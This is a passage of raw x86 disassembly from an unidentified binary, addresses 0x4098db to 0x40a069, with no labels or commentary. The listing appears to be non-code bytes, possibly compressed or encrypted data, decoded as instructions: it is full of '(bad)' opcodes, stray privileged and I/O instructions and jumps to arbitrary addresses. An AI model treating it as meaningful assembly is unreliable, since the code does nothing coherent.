  4098db:	(bad)  
  4098dc:	and    BYTE PTR [esi],al
  4098de:	inc    esp
  4098df:	in     eax,dx
  4098e0:	fbld   TBYTE PTR [eax-0x69]
  4098e3:	mov    ebx,0x88286ccb
  4098e8:	inc    edi
  4098e9:	and    DWORD PTR [esi+0x35],ebx
  4098ec:	bound  ebp,QWORD PTR [edx+0x5a]
  4098ef:	sbb    BYTE PTR [ebp+0x5d],cl
  4098f2:	(bad)  ds:0xc08172e
  4098f8:	int3   
  4098f9:	arpl   bx,cx
  4098fb:	lea    ax,[esi-0x2]
  4098ff:	mov    esi,0xb1c67293
  409904:	push   eax
  409905:	sbb    ch,bl
  409907:	iret   
  409908:	fisttp QWORD PTR [esi+0x18]
  40990b:	sar    DWORD PTR [esp+ebx*4],1
  40990e:	(bad)  
  40990f:	fisubr WORD PTR ds:0xdb46e9c7
  409915:	sbb    esp,0x9c1067ad
  40991b:	adc    dh,BYTE PTR [edx+edi*1+0x2e]
  40991f:	cmp    ch,bl
  409921:	add    edx,ebp
  409923:	imul   esp,DWORD PTR [ecx+0x73cab39b],0xa871bbe5
  40992d:	mov    WORD PTR [esi+0x12929849],?
  409933:	js     0x409918
  409935:	or     ch,dl
  409937:	mov    cl,dh
  409939:	dec    ebx
  40993a:	in     eax,0x9c
  40993c:	xchg   edi,eax
  40993d:	data16 cmp al,0x3e
  409940:	push   ebx
  409941:	ret    
  409942:	enter  0x30e5,0xa2
  409946:	and    al,0x2
  409948:	cwde   
  409949:	cwde   
  40994a:	cmc    
  40994b:	shr    DWORD PTR [ebp+0x22],0x17
  40994f:	pop    ss
  409950:	sar    DWORD PTR [edx-0x534f7ec],cl
  409956:	imul   ebx,DWORD PTR es:[esi],0x3664ef9
  40995d:	dec    ebp
  40995e:	in     al,dx
  40995f:	ins    DWORD PTR es:[edi],dx
  409960:	push   esi
  409961:	pop    eax
  409962:	fdiv   st(2),st
  409964:	cdq    
  409965:	and    BYTE PTR [ecx],dl
  409967:	popf   
  409968:	cmp    eax,0xd23ee69f
  40996d:	sub    al,0xfb
  40996f:	adc    eax,0xf8842d78
  409974:	mov    ecx,0x1dc477fc
  409979:	fisttp DWORD PTR [eax]
  40997b:	sbb    DWORD PTR [edi+edx*1],ebp
  40997e:	clc    
  40997f:	adc    al,0x41
  409981:	dec    esi
  409982:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409984:	adc    DWORD PTR [esi],edx
  409986:	mov    ah,0x2b
  409988:	mov    edi,0xa1f0c3ad
  40998d:	loop   0x40991c
  40998f:	inc    edi
  409990:	fs cmp al,0x2b
  409993:	retf   
  409994:	push   edx
  409995:	lock xchg esi,eax
  409997:	pop    ebp
  409998:	adc    BYTE PTR [ebx-0x289c16ff],al
  40999e:	mov    bl,0x9a
  4099a0:	sbb    esi,DWORD PTR [eax+0x3a]
  4099a3:	ds out 0x21,al
  4099a6:	sub    bl,BYTE PTR [esi+0x51]
  4099a9:	icebp  
  4099aa:	gs push ecx
  4099ac:	lahf   
  4099ad:	fcom   QWORD PTR [edx+0x6b]
  4099b0:	mov    al,ds:0x817bcb0a
  4099b5:	push   ds
  4099b6:	xlat   BYTE PTR ds:[ebx]
  4099b7:	xor    BYTE PTR [edx+0x39671217],0xb8
  4099be:	stos   BYTE PTR es:[edi],al
  4099bf:	dec    eax
  4099c0:	add    al,BYTE PTR [edx]
  4099c2:	push   ds
  4099c3:	fcom   DWORD PTR [edx-0x32]
  4099c6:	les    edx,FWORD PTR [eax-0x39454ca7]
  4099cc:	loope  0x409984
  4099ce:	repnz and eax,esi
  4099d1:	retf   
  4099d2:	pop    ebx
  4099d3:	cli    
  4099d4:	sub    al,0x7e
  4099d6:	mov    ch,0x81
  4099d8:	pop    esp
  4099d9:	mov    eax,ds:0x47d9b543
  4099de:	popf   
  4099df:	js     0x4099ce
  4099e1:	retf   
  4099e2:	pop    esp
  4099e3:	mov    eax,0xf138ea58
  4099e8:	xor    DWORD PTR cs:[ebp+ebp*2+0x14],edx
  4099ed:	scas   al,BYTE PTR es:[edi]
  4099ee:	test   BYTE PTR [esi],dl
  4099f0:	loope  0x4099ce
  4099f2:	inc    edi
  4099f3:	adc    esp,edx
  4099f5:	jmp    0xbdb7:0x101b76b2
  4099fc:	push   ecx
  4099fd:	ins    DWORD PTR es:[edi],dx
  4099fe:	add    ebp,DWORD PTR [edx+0x6f]
  409a01:	mov    ah,0x29
  409a03:	fisubr WORD PTR [ecx-0x74c4f2ae]
  409a09:	and    esi,DWORD PTR [edx+0x77]
  409a0c:	pop    ebp
  409a0d:	iret   
  409a0e:	retf   0xf1ad
  409a11:	mov    ds:0x3e94a931,eax
  409a16:	jnp    0x409a42
  409a18:	loope  0x409a84
  409a1a:	ds push edx
  409a1c:	ja     0x4099c8
  409a1e:	inc    ebx
  409a1f:	ins    DWORD PTR es:[edi],dx
  409a20:	sub    bh,BYTE PTR [edi]
  409a22:	rol    DWORD PTR [ebx],0xbd
  409a25:	shr    DWORD PTR [ebx],cl
  409a27:	jbe    0x4099e8
  409a29:	cmp    al,0xf
  409a2b:	xor    bh,BYTE PTR [ecx-0x25]
  409a2e:	pop    edi
  409a2f:	retf   
  409a30:	shl    DWORD PTR [edx+ebp*2],1
  409a33:	(bad)  
  409a34:	shl    dh,cl
  409a36:	outs   dx,BYTE PTR ds:[esi]
  409a37:	pop    ecx
  409a38:	popf   
  409a39:	mov    esp,0xd963f97
  409a3e:	in     eax,dx
  409a3f:	stos   DWORD PTR es:[edi],eax
  409a40:	sbb    cl,BYTE PTR [edx+edx*2-0x4d]
  409a44:	jno    0x409a32
  409a46:	fst    QWORD PTR [ebx]
  409a48:	repnz cwde 
  409a4a:	mov    ebx,0x9f664bf7
  409a4f:	loope  0x409a3c
  409a51:	ret    0xf214
  409a54:	js     0x409a76
  409a56:	fldenv [edx-0x45461a12]
  409a5c:	das    
  409a5d:	dec    ebp
  409a5e:	sub    DWORD PTR [ebp-0x7cb963d5],edx
  409a64:	loopne 0x4099e7
  409a66:	jae    0x409a07
  409a68:	js     0x409a24
  409a6a:	cli    
  409a6b:	dec    ebx
  409a6c:	(bad)  [ecx-0x16bdf6d7]
  409a72:	lods   al,BYTE PTR ds:[esi]
  409a73:	pop    ds
  409a74:	add    ch,bl
  409a76:	pop    ebx
  409a77:	aad    0x37
  409a79:	sahf   
  409a7a:	pop    ds
  409a7b:	mov    bh,0x47
  409a7d:	(bad)  
  409a7e:	int    0x84
  409a80:	mov    ecx,0xf9a24d58
  409a85:	loope  0x409a0e
  409a87:	ror    DWORD PTR [edi+ebp*4+0xf],cl
  409a8b:	pop    ebx
  409a8c:	mov    ebx,0x5f00354f
  409a91:	xchg   BYTE PTR [edx],bh
  409a93:	mov    esp,0xd65054b
  409a98:	stos   BYTE PTR es:[edi],al
  409a99:	sbb    BYTE PTR [ecx],bh
  409a9b:	pushf  
  409a9c:	dec    ebx
  409a9d:	pop    ecx
  409a9e:	jp     0x409aeb
  409aa0:	repz ret 
  409aa2:	ss test eax,0x60376b2e
  409aa8:	sub    eax,0xd25876d4
  409aad:	fsub   DWORD PTR [ecx-0x47]
  409ab0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  409ab2:	mov    dl,0x4c
  409ab4:	dec    eax
  409ab5:	xchg   ebx,eax
  409ab6:	add    BYTE PTR [ecx],0x29
  409ab9:	mov    bl,BYTE PTR [ebx-0x70]
  409abc:	(bad)  
  409abd:	fcomp  QWORD PTR [esi-0x67]
  409ac0:	mov    edx,0x8bb4e6dc
  409ac5:	mov    BYTE PTR [edx-0x2df05894],0x58
  409acc:	bound  sp,DWORD PTR [eax-0x6379bc9c]
  409ad3:	or     esi,edi
  409ad5:	in     eax,0xe6
  409ad7:	mov    eax,ds:0xd0bd957f
  409adc:	mov    cl,0x9f
  409ade:	aas    
  409adf:	xor    eax,DWORD PTR [ebx+ebp*2+0x68e9f7fe]
  409ae6:	adc    eax,0x233683c8
  409aeb:	adc    ch,BYTE PTR ds:0x92911f17
  409af1:	imul   edi,DWORD PTR [edi+0x7d],0x584d38be
  409af8:	xchg   ebp,eax
  409af9:	outs   dx,DWORD PTR ds:[esi]
  409afa:	sar    DWORD PTR [ecx-0x2605f752],0x45
  409b01:	repnz std 
  409b03:	adc    BYTE PTR [edx],ch
  409b05:	out    dx,eax
  409b06:	not    DWORD PTR [eax+0x40]
  409b09:	bound  edi,QWORD PTR [ebx+0x71978f77]
  409b0f:	inc    esi
  409b10:	sub    al,0xcc
  409b12:	pop    edx
  409b13:	sahf   
  409b14:	int    0x8f
  409b16:	add    DWORD PTR [edi],esp
  409b18:	(bad)  
  409b1b:	xor    bh,BYTE PTR [edx+0x77e3ae9b]
  409b21:	bound  esp,QWORD PTR [ebp-0x68f1b0b5]
  409b27:	(bad)  
  409b29:	dec    ebp
  409b2a:	add    DWORD PTR [ebx-0x69],esi
  409b2d:	pop    ebp
  409b2e:	xchg   ebx,ebp
  409b30:	dec    esi
  409b31:	js     0x409b2b
  409b33:	sbb    DWORD PTR [eax],edi
  409b35:	adc    ecx,DWORD PTR [ebx]
  409b37:	mov    ah,0x2e
  409b39:	call   0xa4ad:0x1ec2d7ca
  409b40:	rol    BYTE PTR [edx-0x677502eb],0xf4
  409b47:	pop    esp
  409b48:	mov    ?,ebp
  409b4a:	sbb    edi,0x19
  409b4d:	push   ebp
  409b4e:	add    dl,BYTE PTR [ebp+0x6c108779]
  409b54:	lods   eax,DWORD PTR ds:[esi]
  409b55:	jle    0x409bbf
  409b57:	lahf   
  409b58:	stos   DWORD PTR es:[edi],eax
  409b59:	ins    DWORD PTR es:[edi],dx
  409b5a:	in     eax,0x1f
  409b5c:	fiadd  DWORD PTR [ebx-0x43f47a43]
  409b62:	dec    ecx
  409b63:	ja     0x409b4c
  409b65:	shr    BYTE PTR [edx-0x65907372],0x82
  409b6c:	mov    ebp,0xd7cded46
  409b71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b72:	(bad)  
  409b73:	dec    esi
  409b75:	fisub  DWORD PTR [eax-0x7e]
  409b78:	inc    esi
  409b79:	pop    ecx
  409b7a:	xor    ecx,DWORD PTR [esi-0x439a429d]
  409b80:	test   DWORD PTR [eax+0x48],0x15c633cc
  409b87:	or     eax,0xbfd1d4c
  409b8c:	jbe    0x409b0e
  409b8e:	(bad)  
  409b8f:	xchg   edx,eax
  409b90:	(bad)  
  409b91:	fcom   DWORD PTR [ecx]
  409b93:	xchg   ecx,eax
  409b94:	adc    ah,ch
  409b96:	pop    ss
  409b97:	add    ebx,DWORD PTR [ebp+0x7e]
  409b9a:	inc    edi
  409b9b:	cmp    al,0xe4
  409b9d:	out    0xa2,eax
  409b9f:	sbb    ch,BYTE PTR [ebx-0x5f]
  409ba2:	adc    al,0x15
  409ba4:	push   esp
  409ba5:	xchg   ch,ch
  409ba7:	inc    BYTE PTR [esi]
  409ba9:	stos   BYTE PTR es:[edi],al
  409baa:	add    BYTE PTR [ecx-0x3d],ah
  409bad:	idiv   DWORD PTR [eax+0x2d9a5cd4]
  409bb3:	adc    ebx,edi
  409bb5:	les    edx,FWORD PTR [ecx+0x688aed8a]
  409bbb:	test   eax,0x682a3e5b
  409bc0:	push   eax
  409bc1:	fisubr DWORD PTR [ecx+eiz*1+0x64]
  409bc5:	ret    
  409bc6:	pop    ebp
  409bc7:	cld    
  409bc8:	push   ebp
  409bc9:	add    DWORD PTR [eax],edi
  409bcb:	mov    al,ds:0x3349dc36
  409bd0:	outs   dx,BYTE PTR ds:[esi]
  409bd1:	and    eax,0x7815f599
  409bd6:	xchg   ebp,eax
  409bd7:	jmp    0xf3ef8d8e
  409bdc:	sbb    dl,BYTE PTR [edi+0x75a81e66]
  409be2:	xor    DWORD PTR [esi-0x76],ecx
  409be5:	add    bl,cl
  409be7:	jg     0x409bcb
  409be9:	pop    eax
  409bea:	pusha  
  409beb:	loope  0x409c54
  409bed:	xor    BYTE PTR [ecx-0x39],bl
  409bf0:	inc    ebp
  409bf1:	add    eax,0x731a598b
  409bf6:	fs test eax,0x8ff72dd9
  409bfc:	mov    al,dl
  409bfe:	jecxz  0x409bb5
  409c00:	adc    BYTE PTR [edi-0x7d],cl
  409c03:	into   
  409c04:	xor    bh,cl
  409c06:	sbb    ecx,ebp
  409c08:	or     al,0x1b
  409c0a:	outs   dx,DWORD PTR ds:[esi]
  409c0b:	push   ebp
  409c0c:	mov    al,BYTE PTR [ecx]
  409c0e:	fcos   
  409c10:	retf   0xd0e2
  409c13:	xor    BYTE PTR [ecx],dh
  409c15:	jns    0x409c47
  409c17:	mov    ds:0xd383b013,eax
  409c1c:	jmp    0xb5885442
  409c21:	inc    esp
  409c22:	xchg   DWORD PTR [eax-0x2f],ebp
  409c25:	jle    0x409bc9
  409c27:	imul   edx,DWORD PTR [esi-0x4],0xffffffc1
  409c2b:	push   eax
  409c2c:	addr16 nop
  409c2e:	imul   eax,DWORD PTR [bx+si+0x6f],0x9baed6e0
  409c36:	sub    al,0xf8
  409c38:	(bad)  
  409c39:	pop    eax
  409c3a:	repz fst DWORD PTR [ecx+esi*1+0x454edcb8]
  409c42:	jb     0x409c69
  409c44:	xor    bl,ch
  409c46:	(bad)  
  409c47:	cmp    cl,ch
  409c49:	sbb    BYTE PTR [eax-0x55c3f39b],al
  409c4f:	cmp    BYTE PTR [eax],dl
  409c51:	pop    edi
  409c52:	push   edx
  409c53:	pop    ecx
  409c54:	aaa    
  409c55:	lods   eax,DWORD PTR ds:[esi]
  409c56:	cmp    bh,BYTE PTR [eax-0x5a]
  409c59:	xor    DWORD PTR [eax+0x1c4786c3],0x61ab9b8f
  409c63:	fimul  WORD PTR [edx-0x3bfb975b]
  409c69:	bound  eax,QWORD PTR [edi+eax*4]
  409c6c:	jle    0x409c26
  409c6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c6f:	dec    ecx
  409c70:	xchg   ebx,eax
  409c71:	sahf   
  409c72:	retf   0xe5cf
  409c75:	inc    esp
  409c76:	mov    al,ah
  409c78:	push   esi
  409c79:	xlat   BYTE PTR ds:[ebx]
  409c7a:	call   0xd57e:0x86d7ec3
  409c81:	push   es
  409c82:	jne    0x409c8e
  409c84:	idiv   BYTE PTR [esi-0xa654886]
  409c8a:	mov    al,0x1a
  409c8c:	repnz fidivr WORD PTR [eax-0x47bd0647]
  409c93:	inc    esp
  409c94:	mov    BYTE PTR [ebp+0x24],cl
  409c97:	pop    ebx
  409c98:	mov    al,ds:0x75dfe86
  409c9d:	stos   DWORD PTR es:[edi],eax
  409c9e:	cdq    
  409c9f:	pop    eax
  409ca0:	xchg   ecx,eax
  409ca1:	xor    al,0x2a
  409ca3:	jmp    0x409c60
  409ca5:	fsub   DWORD PTR [edi]
  409ca7:	jo     0x409c44
  409ca9:	sbb    edi,0x46b052ac
  409caf:	xor    ah,bl
  409cb1:	mov    esi,0xdd4ae946
  409cb6:	jae    0x409c97
  409cb8:	pop    ds
  409cb9:	std    
  409cba:	xchg   esp,eax
  409cbb:	adc    bl,BYTE PTR [esi-0x56aaf0ea]
  409cc1:	daa    
  409cc2:	mov    ecx,0x72976aa2
  409cc7:	inc    ecx
  409cc8:	(bad)  
  409cc9:	mov    esp,0x4b6473ad
  409cce:	pushf  
  409ccf:	pop    esp
  409cd0:	cvttps2pi mm1,xmm1
  409cd3:	xchg   ebx,eax
  409cd4:	inc    ecx
  409cd5:	in     eax,dx
  409cd6:	cmp    al,0x20
  409cd8:	xor    cl,BYTE PTR [esp+eiz*2-0x16]
  409cdc:	hlt    
  409cdd:	xchg   esp,eax
  409cde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cdf:	les    edx,FWORD PTR [ebx+0x4a9b9fe3]
  409ce5:	not    dl
  409ce7:	mov    esp,0x9a4a70c1
  409cec:	pushf  
  409ced:	pop    esp
  409cee:	adc    ebx,DWORD PTR [edx+0x2dcbaed2]
  409cf4:	xchg   ebp,eax
  409cf5:	inc    ebx
  409cf6:	dec    ebx
  409cf7:	outs   dx,BYTE PTR ds:[esi]
  409cf8:	mov    cl,0xd4
  409cfa:	pusha  
  409cfb:	dec    eax
  409cfc:	cld    
  409cfd:	xor    cl,dl
  409cff:	imul   edx,DWORD PTR [eax],0xc4b2ecb3
  409d05:	ja     0x409c9c
  409d07:	ret    0xd167
  409d0a:	pop    esp
  409d0b:	xchg   DWORD PTR [ecx],edx
  409d0d:	mov    ch,0xa0
  409d0f:	inc    edi
  409d10:	pop    edi
  409d11:	and    DWORD PTR [esi],ebx
  409d13:	xchg   ebp,eax
  409d14:	in     eax,0xfd
  409d16:	jmp    0x92c88114
  409d1b:	(bad)  
  409d1d:	fidiv  WORD PTR ss:[edx+ebx*8+0xc]
  409d22:	sbb    al,0x6d
  409d24:	jne    0x409d4b
  409d26:	stos   DWORD PTR es:[edi],eax
  409d27:	in     eax,0x74
  409d29:	jno    0x409d48
  409d2b:	(bad)  
  409d2c:	xor    al,0x18
  409d2e:	mov    ds:0x8ab56c38,al
  409d33:	push   esi
  409d34:	js     0x409d60
  409d36:	rol    BYTE PTR [ebp-0xf5e91b],1
  409d3c:	aaa    
  409d3d:	mov    WORD PTR [eax-0x3262157c],?
  409d43:	xchg   esi,eax
  409d44:	push   esi
  409d45:	jnp    0x409d51
  409d47:	jne    0x409cee
  409d49:	lock push ebx
  409d4b:	test   BYTE PTR [edx],ah
  409d4d:	push   ebx
  409d4e:	ins    DWORD PTR es:[edi],dx
  409d4f:	xchg   BYTE PTR ds:0x870583d,bh
  409d55:	push   edi
  409d56:	imul   BYTE PTR [eax+0x24]
  409d59:	popa   
  409d5a:	jge    0x409d70
  409d5c:	push   ebp
  409d5d:	or     esi,DWORD PTR ds:0x4272f430
  409d63:	xchg   cl,dh
  409d65:	lods   eax,DWORD PTR ds:[esi]
  409d66:	(bad)  
  409d67:	and    al,0xfb
  409d69:	ficomp DWORD PTR [ebx]
  409d6b:	icebp  
  409d6c:	rcr    BYTE PTR [eax-0x80],1
  409d6f:	dec    edx
  409d70:	test   DWORD PTR [edx],esp
  409d72:	icebp  
  409d73:	push   DWORD PTR gs:0xe6f795ed
  409d7a:	and    BYTE PTR [esi-0x21c909ab],ch
  409d80:	sbb    cl,BYTE PTR [edi+0x286c637d]
  409d86:	cmp    BYTE PTR [ecx+0x6f7a5361],bh
  409d8c:	xor    cl,BYTE PTR [ecx+0x44]
  409d8f:	pop    ecx
  409d90:	dec    ebx
  409d91:	xor    eax,ecx
  409d93:	push   0xffffff84
  409d95:	std    
  409d96:	ds scas eax,DWORD PTR es:[edi]
  409d98:	mov    eax,edi
  409d9a:	retf   
  409d9b:	and    bh,al
  409d9d:	add    cl,ah
  409d9f:	in     eax,dx
  409da0:	ret    
  409da1:	cli    
  409da2:	cwde   
  409da3:	mov    ds:0x2566bbf3,al
  409da8:	add    DWORD PTR [eax-0x23],0xffffffef
  409dac:	scas   eax,DWORD PTR es:[edi]
  409dad:	xchg   edi,eax
  409dae:	repnz add DWORD PTR [esi],0x332eb046
  409db5:	imul   esi,DWORD PTR [esi-0x41a94288],0x5e629205
  409dbf:	je     0x409e34
  409dc1:	sbb    dh,BYTE PTR [ecx+0x56]
  409dc4:	push   edx
  409dc5:	xor    eax,0xd0fcbee
  409dca:	pop    ecx
  409dcb:	pushf  
  409dcc:	pop    esi
  409dcd:	aad    0xf1
  409dcf:	mov    ah,dl
  409dd1:	add    BYTE PTR [ecx+0x6dc3fc0a],al
  409dd7:	sub    al,0x5e
  409dd9:	sub    DWORD PTR [ebp-0x36],edi
  409ddc:	xor    dh,ah
  409dde:	jmp    0x14a9286
  409de3:	pop    edi
  409de4:	jnp    0x409d81
  409de6:	push   esp
  409de7:	mov    esp,0x37a47403
  409dec:	loope  0x409e20
  409dee:	mov    cl,0xd8
  409df0:	jecxz  0x409db0
  409df2:	les    esp,FWORD PTR [eax-0x79bca032]
  409df8:	fisubr DWORD PTR [eax]
  409dfa:	rol    BYTE PTR [ecx-0x57],1
  409dfd:	or     ah,BYTE PTR [esi+0x187aa2f5]
  409e03:	icebp  
  409e04:	inc    ebp
  409e05:	sub    edi,esp
  409e07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e08:	xchg   esp,eax
  409e09:	mov    ah,0x5b
  409e0b:	popf   
  409e0c:	ss push cs
  409e0e:	adc    esi,eax
  409e10:	ds inc ecx
  409e12:	or     al,0xa8
  409e14:	jns    0x409e58
  409e16:	mov    al,0x8c
  409e18:	retf   0x9b3e
  409e1b:	test   dl,dl
  409e1d:	xchg   esp,eax
  409e1e:	cdq    
  409e1f:	mov    ecx,0xcdd52b2e
  409e24:	xor    bh,ah
  409e26:	ss pop esi
  409e28:	aaa    
  409e29:	cld    
  409e2a:	test   BYTE PTR [esi],bl
  409e2c:	cmp    eax,0x56a6813f
  409e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e32:	or     edx,eax
  409e34:	int    0xf1
  409e36:	lds    edi,FWORD PTR [ebp+0x7d]
  409e39:	xor    al,0x11
  409e3b:	call   0xa91bd141
  409e40:	push   ebp
  409e41:	das    
  409e42:	repnz (bad) 
  409e44:	jecxz  0x409e77
  409e46:	(bad)  
  409e48:	shr    DWORD PTR [edx],1
  409e4a:	xlat   BYTE PTR ds:[ebx]
  409e4b:	inc    edx
  409e4c:	sub    edi,DWORD PTR [edx]
  409e4e:	add    al,0xb
  409e50:	xchg   eax,esp
  409e52:	fadd   QWORD PTR [edi-0xf7e6eb]
  409e58:	mov    ebx,0xfa4783fc
  409e5d:	enter  0x25be,0xd1
  409e61:	xchg   edx,eax
  409e62:	ss pop ecx
  409e64:	loop   0x409ebf
  409e66:	jo     0x409ed7
  409e68:	das    
  409e69:	(bad)  [ebx-0x6395a81b]
  409e6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e70:	xchg   ecx,eax
  409e71:	dec    ebp
  409e72:	sbb    al,0x9f
  409e74:	aad    0x30
  409e76:	or     al,0xbe
  409e78:	retf   0x4624
  409e7b:	sub    eax,0x60e31aae
  409e80:	pop    ecx
  409e81:	jmp    0xbb0d24d2
  409e86:	mov    ds,WORD PTR [ebp+0x29]
  409e89:	jle    0x409e8c
  409e8b:	pop    es
  409e8c:	ror    DWORD PTR [eax-0x2a39dab8],cl
  409e92:	sub    dl,dl
  409e94:	cld    
  409e95:	push   es
  409e96:	add    ch,BYTE PTR [ebx+0x6f]
  409e99:	pop    es
  409e9a:	(bad)  
  409e9b:	xor    edi,esi
  409e9d:	into   
  409e9e:	inc    ebx
  409e9f:	out    dx,al
  409ea0:	xchg   ebp,eax
  409ea1:	arpl   WORD PTR [ebp-0x76dc59dd],bp
  409ea7:	ror    DWORD PTR [edi+0x7f1eba74],cl
  409ead:	iret   
  409eae:	imul   esi,esi,0xffffff8b
  409eb1:	and    al,0x5
  409eb3:	push   es
  409eb4:	and    BYTE PTR [ecx],ah
  409eb6:	dec    ebx
  409eb7:	sub    ecx,DWORD PTR [ebp-0x2f]
  409eba:	jle    0x409f12
  409ebc:	pop    ebp
  409ebd:	fist   DWORD PTR [edi]
  409ebf:	std    
  409ec0:	cmp    edi,DWORD PTR [eax+0x43ce5685]
  409ec6:	push   eax
  409ec7:	push   ds
  409ec8:	out    0xf3,al
  409eca:	jb     0x409e88
  409ecc:	xchg   ecx,eax
  409ecd:	cmc    
  409ece:	mov    bh,0xcc
  409ed0:	addr16 aaa 
  409ed2:	int3   
  409ed3:	das    
  409ed4:	inc    esi
  409ed5:	add    DWORD PTR [ecx+eax*1+0x72],ebx
  409ed9:	pop    eax
  409eda:	xor    DWORD PTR ds:0x2e3dc9d1,edi
  409ee0:	pop    ss
  409ee1:	not    BYTE PTR [edi+eiz*8]
  409ee4:	stc    
  409ee5:	clc    
  409ee6:	inc    ebp
  409ee7:	push   edx
  409ee8:	inc    edi
  409ee9:	jb     0x409eef
  409eeb:	stos   BYTE PTR es:[edi],al
  409eec:	cli    
  409eed:	or     BYTE PTR [ebx+0x34],dl
  409ef0:	push   ss
  409ef1:	mov    esp,0x84970819
  409ef6:	aas    
  409ef7:	icebp  
  409ef8:	pop    esp
  409ef9:	xchg   DWORD PTR [edx+0x76],esp
  409efc:	jmp    0x965e:0x6e39d678
  409f03:	xchg   edx,eax
  409f04:	mov    edx,0x7d77ab17
  409f09:	pop    ecx
  409f0a:	shr    BYTE PTR [edx+0x4a],1
  409f0d:	sub    ebx,esp
  409f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f10:	data16 jo 0x409ee6
  409f13:	aam    0x8d
  409f15:	adc    al,0xa6
  409f17:	fwait
  409f18:	pop    esi
  409f19:	inc    ebp
  409f1a:	xor    eax,edi
  409f1c:	(bad)  
  409f1d:	iret   
  409f1e:	inc    ebx
  409f1f:	data16 fcom DWORD PTR ss:[edx+0x11dcde96]
  409f27:	(bad)
  409f2c:	jns    0x208472bc
  409f32:	je     0x409f05
  409f34:	in     al,0x55
  409f36:	out    0x49,al
  409f38:	ret    
  409f39:	xor    esi,DWORD PTR [edi+0x6]
  409f3c:	mov    bh,0x87
  409f3e:	mov    ah,0x51
  409f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f41:	sbb    BYTE PTR [eax-0x4a],bh
  409f44:	jg     0x409f54
  409f46:	ror    DWORD PTR [ebx],cl
  409f48:	cmp    dh,bh
  409f4a:	mov    ch,0x86
  409f4c:	or     al,0x2a
  409f4e:	nop
  409f4f:	retf   
  409f50:	jmp    0x52de336
  409f55:	and    al,0xda
  409f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f58:	and    al,0x83
  409f5a:	add    DWORD PTR [esi+0x61],ebp
  409f5d:	mov    eax,ds:0x56aaf064
  409f62:	loop   0x409f89
  409f64:	inc    ebx
  409f65:	push   ecx
  409f66:	ins    DWORD PTR es:[edi],dx
  409f67:	outs   dx,BYTE PTR ds:[esi]
  409f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f69:	pop    ss
  409f6a:	scas   eax,DWORD PTR es:[edi]
  409f6b:	mov    edx,fs
  409f6d:	mov    ch,0xf2
  409f6f:	loopne 0x409f33
  409f71:	and    eax,0x4261fcd1
  409f76:	bound  edx,QWORD PTR gs:[ecx+0x17049f84]
  409f7d:	out    dx,eax
  409f7e:	test   eax,0x267fc653
  409f83:	popf   
  409f84:	adc    DWORD PTR [edi-0x76],esi
  409f87:	xchg   ecx,eax
  409f88:	mov    ch,0x97
  409f8a:	or     eax,0x14a1b58e
  409f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f91:	in     al,0x44
  409f93:	fidivr WORD PTR [esi]
  409f95:	and    al,0xcf
  409f97:	shl    bh,cl
  409f99:	rcl    edi,0xcb
  409f9c:	adc    ecx,DWORD PTR ds:0xeb88c541
  409fa2:	push   0xcd3469a9
  409fa7:	and    dh,al
  409fa9:	lds    esi,FWORD PTR [edi]
  409fab:	stos   BYTE PTR es:[edi],al
  409fac:	rcl    DWORD PTR [ecx-0x5f],cl
  409faf:	mov    eax,ds:0x5edf17d
  409fb4:	lock jmp 0xb7e3fb8d
  409fba:	sub    al,0x3e
  409fbc:	mov    esi,0x355bead
  409fc1:	adc    ah,BYTE PTR [esi+0x23]
  409fc4:	cmp    al,0xb2
  409fc6:	cs cmp eax,0x54fb10dc
  409fcc:	cmc    
  409fcd:	mov    WORD PTR [ebx-0xa],ds
  409fd0:	cmp    ch,BYTE PTR [esi-0x68]
  409fd3:	test   BYTE PTR [ebp+0x801f341],cl
  409fd9:	xchg   ebp,eax
  409fda:	test   DWORD PTR [edx+0x7de9c672],ebx
  409fe0:	pushf  
  409fe1:	xchg   edi,eax
  409fe2:	hlt    
  409fe3:	jnp    0x40a053
  409fe5:	sub    DWORD PTR [edx],edx
  409fe7:	retf   0x54bf
  409fea:	das    
  409feb:	push   ss
  409fec:	(bad)  
  409fed:	mov    esi,DWORD PTR [esi+0x553efb25]
  409ff3:	(bad)  
  409ff4:	out    0xbe,eax
  409ff6:	sbb    bh,BYTE PTR [ecx-0x1d]
  409ff9:	sbb    eax,0x588a004d
  409ffe:	bound  edi,QWORD PTR [esi-0x1eedfa93]
  40a004:	pop    esi
  40a005:	test   al,0xe4
  40a007:	mov    edx,0xdac8dce9
  40a00c:	xor    DWORD PTR [ecx+0x47],edi
  40a00f:	sub    eax,0xb99c8d79
  40a014:	cmp    esp,DWORD PTR [eax+0x5a]
  40a017:	in     al,0x21
  40a019:	mov    bl,0xb6
  40a01b:	adc    bl,BYTE PTR [ebx+esi*1-0x4651d665]
  40a022:	inc    edx
  40a023:	ror    BYTE PTR [ebx-0x63],cl
  40a026:	add    BYTE PTR [si],dh
  40a029:	repz pop edi
  40a02b:	(bad)  
  40a02c:	into   
  40a02d:	pusha  
  40a02e:	pushf  
  40a02f:	mov    ah,0xdb
  40a031:	cmp    BYTE PTR [edi],cl
  40a033:	popf   
  40a034:	jge    0x409fe9
  40a036:	add    eax,0xb9e20f86
  40a03b:	jl     0x40a04d
  40a03d:	and    edi,DWORD PTR [ecx]
  40a03f:	stc    
  40a040:	push   edi
  40a041:	test   ecx,0x321e83a4
  40a047:	add    DWORD PTR [edi+ecx*2],eax
  40a04a:	in     al,dx
  40a04b:	int3   
  40a04c:	mov    bl,0x6b
  40a04e:	adc    al,0x2f
  40a050:	add    esp,edi
  40a052:	pushfw 
  40a054:	jmp    0x40a032
  40a056:	daa    
  40a057:	adc    eax,eax
  40a059:	dec    esi
  40a05a:	sbb    cl,BYTE PTR [eax+0xe4ff21c]
  40a060:	cmp    dh,BYTE PTR [eax+0x28e36892]
  40a066:	or     edx,DWORD PTR [edx+0x3]
  40a069:	retf   
